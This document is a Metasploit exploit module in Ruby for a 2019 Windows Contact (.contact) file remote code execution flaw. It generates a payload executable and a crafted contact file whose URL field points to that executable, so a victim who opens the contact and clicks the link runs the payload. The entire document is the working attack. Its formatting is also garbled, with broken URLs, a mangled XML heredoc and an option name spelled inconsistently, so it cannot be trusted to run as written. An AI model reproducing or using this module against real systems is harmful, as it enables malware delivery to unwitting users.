##
#This module requires Metasploit: https: //metasploit.com/download
#Current source: https: //github.com/rapid7/metasploit-framework
##

  class MetasploitModule < Msf::Exploit::Remote
Rank = NormalRanking

include Msf::Exploit::FILEFORMAT
include Msf::Exploit::EXE

def initialize(info = {})
super(update_info(info,
  'Name' => "Microsoft Windows CONTACT - Remote Code Execution",
  'Description' => % q {
    This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Microsoft Windows.
    User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.
  },
  'License' => MSF_LICENSE,
  'Author' => [
    'Exploit found by: John Page (aka hyp3rlinx)', 'Module written by: Brenner Little '
  ],
  'References' => [
    ['EDB-ID', '46188'],
  ],
  'Payload' => {
    'DisableNops' => true
  },
  'DefaultOptions' => {
    'DisablePayloadHandler' => true
  },
  'Platform' => 'win',
  'Targets' => [
    ['Windows', {}],
  ],
  'Privileged' => false,
  'DisclosureDate' => "2019-01-17",
  'DefaultTarget' => 0))

register_options(
  [
    OptString.new('FILENAME', [false, 'The name of the malicious payload to execute', 'msf.com']),
    OptString.new('ContactName', [false, 'The name of the Contact File', 'John Smith'])
  ])

deregister_options('FILE_CONTENTS')
end

def exploit
require 'fileutils'
contactname = "#{datastore['Contactname']}"
test = contactname
exename = "#{datastore['FILENAME']}"
xml = | << ? xml version = "1.0"
encoding = "UTF-8" ? >
  <
  c : contact c: Version = "1"
xmlns: c = "http://schemas.microsoft.com/Contact"
xmlns: xsi = "http://www.w3.org/2001/XMLSchema-instance"
xmlns: MSP2P = "http://schemas.microsoft.com/Contact/Extended/MSP2P" >
  <
  c: CreationDate > 2019 - 03 - 24 T02: 30: 47 Z < /c:CreationDate><c:Extended xsi:nil="true"/ >
  <
  c: ContactIDCollection > < c: ContactID c: ElementID = "bfea8bff-d916-4364-915e-0a893b879083" > < c: Value > da3b371c - c7a0 - 48 f0 - b08e - 41 b4cef85f93 < /c:Value></c: ContactID > < /c:ContactIDCollection><c:NameCollection><c:Name c:ElementID="c125e76a-50d9-40b0-aec1-6e4f7f85a648"><c:FormattedName>contact1</c: FormattedName > < c: GivenName > contact1 < /c:GivenName></c: Name > < /c:NameCollection><c:UrlCollection><c:Url c:ElementID="0e5978f5-082b-4ac9-96d0-f275dc4810d5"><c:Value>contact2</c: Value > < c: LabelCollection > < c: Label > Personal < /c:Label></c: LabelCollection > < /c:Url></c: UrlCollection > < c: PhotoCollection > < c: Photo c: ElementID = "48f0096f-a537-4bc9-a025-126163c55fde" > < c: LabelCollection > < c: Label > UserTile < /c:Label></c: LabelCollection > < /c:Photo></c: PhotoCollection > < /c:contact> |

  FileUtils.mkdir_p test
FileUtils.mkdir_p test + "/http"
exe = generate_payload_exe
xml.gsub!(/contact1/, contactname);
xml.gsub!(/contact2/, "http.\\www." + exename);
File.open(test + "/http/www." + exename, "wb") do |f |
    f.write(exe)
  print_status("Creating '#{datastore['FILENAME']}' file in directory " + test)
File.open(test + "/" + contactname + ".contact", "wb") do |file |
    print_status("Creating '#{datastore['ContactName']}' file in directory " + test)
  file.write(xml)

end
end
end

end
